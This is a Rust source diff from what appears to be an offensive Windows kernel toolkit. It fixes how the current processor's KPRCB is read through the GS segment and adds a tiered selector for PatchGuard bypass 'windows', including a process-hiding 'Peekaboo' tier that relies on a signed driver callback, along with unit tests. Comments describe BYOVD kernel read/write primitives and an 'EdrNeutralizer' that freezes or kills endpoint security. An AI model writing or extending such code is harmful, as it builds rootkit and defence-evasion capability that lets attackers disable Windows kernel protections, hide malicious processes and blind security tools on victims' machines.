@@ -433,9 +433,13 @@ pub fn resolve_offsets(
 
 /// Read the KVA of the current processor's `_KPRCB` at runtime.
 ///
-/// On x64 Windows the GS segment points at the KPCR. `KPCR.Prcb` (a pointer to
-/// the embedded `_KPRCB`) lives at offset `0x188`. This is a single `mov`
-/// instruction — no hardcoded addresses, no version dependency.
+/// On x64 Windows the GS segment points at the KPCR. `KPCR.CurrentPrcb` (a
+/// pointer to the current processor's `_KPRCB`) lives at offset `0x20`
+/// ([`crate::offsets::kpcr::CURRENT_PRCB`], PDB-verified 19041/22621). NOTE:
+/// `gs:[0x188]` is `KPRCB.CurrentThread` (`KPCR.Prcb` @ 0x180 + 0x08), NOT the
+/// PRCB pointer — an earlier revision of this function read that and got a
+/// `_KTHREAD*`. This is a single `mov` — no hardcoded addresses, no version
+/// dependency.
 ///
 /// Used by the PatchGuard window factory to resolve `prcb_kva` for the current
 /// CPU (PG validation runs on the current processor, so this is the right PRCB).
@@ -449,7 +453,7 @@ pub fn read_current_prcb_kva() -> usize {
     let prcb: usize;
     // SAFETY: a single `mov` from a fixed GS offset. No memory write, no
     // syscall. The value is a kernel pointer read atomically.
-    unsafe { core::arch::asm!("mov {}, gs:[0x188]", out(reg) prcb, options(nomem, nostack)) };
+    unsafe { core::arch::asm!("mov {}, gs:[0x20]", out(reg) prcb, options(nomem, nostack)) };
     prcb
 }
 
@@ -464,6 +468,10 @@ pub fn read_current_prcb_kva() -> usize {
 /// `TimingRepairWindow` (Win10 17763–19041, timing-based) > none. The selection
 /// is driven entirely by runtime data — the PG context offsets table and the
 /// `supports_thread_suspend` flag — with no hardcoded build check.
+///
+/// This is tiers 2–3 of the full three-strategy probe; the offset-free
+/// `PeekabooWindow` tier (preferred when a kernel callback seam exists) lives
+/// in [`select_pg_window_with_probe`], which wraps this function.
 ///
 /// ⚠ **EXPERIMENTAL / GATED OFF (kernelsdk-1-1):** every row in
 /// `KNOWN_PG_CONTEXT_BUILDS` currently carries PLACEHOLDER offsets (0x190/0x08
@@ -519,6 +527,40 @@ pub fn select_pg_window(
     }
 }
 
+/// Full three-strategy PG-window capability probe. Priority:
+///
+/// 1. **`PeekabooWindow`** (offset-free, all builds) — PREFERRED. Consumes only
+///    PDB-resolved EPROCESS offsets, so it is NOT blocked by the
+///    kernelsdk-1-1 verified-offsets gate; but it needs a kernel callback seam
+///    (a live [`crate::persistence::PeekabooProbe`]: a signed driver running a
+///    `PsSetCreateProcessNotifyRoutineEx` callback). Chosen when `probe` is
+///    `Some` and the build's EPROCESS offsets resolve.
+/// 2. **`RuntimePgBypassWindow`** (Win11 24H2+, flag-suspension) — needs
+///    VERIFIED PG-context offsets (gated OFF until a table row flips
+///    `verified`).
+/// 3. **`TimingRepairWindow`** (Win10 17763–19041, timing-based) — same gate.
+///
+/// With `probe: None` this degenerates to [`select_pg_window`] (tiers 2–3).
+/// If the probe is present but the build's EPROCESS offsets don't resolve,
+/// selection falls through to tiers 2–3 rather than guessing offsets.
+pub fn select_pg_window_with_probe<'a>(
+    build: u32,
+    krw: &'a dyn KernelRw,
+    probe: Option<&'a dyn crate::persistence::PeekabooProbe>,
+) -> Option<alloc::boxed::Box<dyn PatchGuardKit + 'a>> {
+    // Tier 1: Peekaboo — offset-free + HVCI-safe, preferred whenever the
+    // callback seam exists and EPROCESS offsets are resolvable.
+    if let Some(probe) = probe {
+        if let Some(eprocess) = crate::offsets::for_build(build).map(|row| row.offsets) {
+            return Some(alloc::boxed::Box::new(
+                crate::persistence::PeekabooWindow::new(eprocess, probe, krw),
+            ));
+        }
+    }
+    // Tiers 2–3: PG-context windows behind the verified-offsets gate.
+    select_pg_window(build, krw)
+}
+
 /// Assemble a full [`KernelTier`] by consuming a resolved `KernelBootstrap`.
 ///
 /// This is the operational composition point. It **takes ownership** of the
@@ -538,7 +580,8 @@ pub fn select_pg_window(
 /// - **EDR neutralize** — `EdrNeutralizer` (Freeze/Choke user-mode FFI; Kill via separate call)
 ///
 /// PatchGuard windows are NOT in the tier (they borrow `&dyn KernelRw` for their
-/// repair callback). Use `select_pg_window(build, &*tier.rw)` at the call site.
+/// repair callback). Use `select_pg_window_with_probe(build, &*tier.rw, probe)`
+/// at the call site (or `select_pg_window` when no `PeekabooProbe` seam exists).
 ///
 /// After this call, `tier.rw.kread()` / `tier.rw.kwrite()` are LIVE — the real
 /// kernel primitive (KslD or BYOVD) is owned by the tier. The BYOVD `LoadedDriver`
@@ -657,5 +700,117 @@ pub fn assemble_tier(
         cred,
         neutralize,
         loaded_driver,
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::persistence::PeekabooProbe;
+    use crate::KrwError;
+
+    /// Minimal mock KernelRw (selection only — PeekabooWindow's
+    /// enter_unchecked probes the callback seam and touches no kernel memory
+    /// while nothing is hidden, so an always-erroring primitive suffices).
+    struct NullKrw;
+    impl KernelRw for NullKrw {
+        fn kread(&self, _kaddr: usize, _dst: &mut [u8]) -> Result<(), KrwError> {
+            Err(KrwError::Unavailable("NullKrw"))
+        }
+        fn kwrite(&self, _kaddr: usize, _src: &[u8]) -> Result<(), KrwError> {
+            Err(KrwError::Unavailable("NullKrw"))
+        }
+    }
+
+    /// Mock validation-trigger probe (stands in for the real
+    /// PsSetCreateProcessNotifyRoutineEx-callback driver seam).
+    struct MockProbe {
+        active: bool,
+        armed: bool,
+    }
+    impl PeekabooProbe for MockProbe {
+        fn validation_active(&self) -> Result<bool, KitError> {
+            Ok(self.active)
+        }
+        fn repair_armed(&self) -> Result<bool, KitError> {
+            Ok(self.armed)
+        }
+    }
+
+    /// The PRCB read must use `KPCR.CurrentPrcb` (gs:[0x20]) — NOT gs:[0x188],
+    /// which is KPRCB.CurrentThread (a _KTHREAD*). Under wine/user-mode GS is
+    /// the TEB, so the VALUE is not a PRCB here; what this pins is that the
+    /// function reads exactly the kpcr::CURRENT_PRCB offset.
+    #[cfg(target_arch = "x86_64")]
+    #[test]
+    fn prcb_read_uses_current_prcb_offset() {
+        assert_eq!(crate::offsets::kpcr::CURRENT_PRCB, 0x20);
+        let via_fn = read_current_prcb_kva();
+        let manual: usize;
+        // SAFETY: same single GS read as the function under test.
+        unsafe {
+            core::arch::asm!(
+                "mov {}, gs:[{}]",
+                out(reg) manual,
+                const crate::offsets::kpcr::CURRENT_PRCB,
+                options(nomem, nostack)
+            )
+        };
+        assert_eq!(
+            via_fn, manual,
+            "read must come from gs:[0x20] (CurrentPrcb)"
+        );
+    }
+
+    #[test]
+    fn select_pg_window_prefers_peekaboo_when_probe_available() {
+        let krw = NullKrw;
+        let probe = MockProbe {
+            active: false,
+            armed: true,
+        };
+        // The PG-context gate is OFF for 19041 (placeholder rows) — tiers 2–3
+        // yield nothing.
+        assert!(select_pg_window(19041, &krw).is_none());
+        // Tier 1 (Peekaboo) needs no PG-context offsets: with a live probe +
+        // resolvable EPROCESS offsets it is selected even while the gate is off.
+        let window = select_pg_window_with_probe(19041, &krw, Some(&probe))
+            .expect("Peekaboo is offset-free — selected ahead of the gated windows");
+        // ...and the selected window opens (no validation racing, repair armed).
+        let guard = window
+            .enter_unchecked(&krw)
+            .expect("armed probe → window opens");
+        drop(guard);
+    }
+
+    #[test]
+    fn select_pg_window_refuses_when_repair_not_armed() {
+        let krw = NullKrw;
+        let probe = MockProbe {
+            active: false,
+            armed: false,
+        };
+        // Peekaboo is still the SELECTED window (it exists), but entry must be
+        // refused: hiding without the termination-callback repair guarantees a
+        // 0x139 bugcheck on process exit.
+        let window = select_pg_window_with_probe(19041, &krw, Some(&probe)).expect("selected");
+        assert!(matches!(
+            window.enter_unchecked(&krw),
+            Err(KitError::UnsupportedPosture(_))
+        ));
+    }
+
+    #[test]
+    fn select_pg_window_falls_through_without_probe_or_offsets() {
+        let krw = NullKrw;
+        // No probe → degenerates to tiers 2–3, which are gated OFF → None.
+        assert!(select_pg_window_with_probe(19041, &krw, None).is_none());
+        // Probe present but EPROCESS offsets unresolvable for an unknown build
+        // → falls through to the (gated OFF) tiers instead of guessing.
+        let probe = MockProbe {
+            active: false,
+            armed: true,
+        };
+        assert!(select_pg_window_with_probe(99999, &krw, Some(&probe)).is_none());
     }
 }
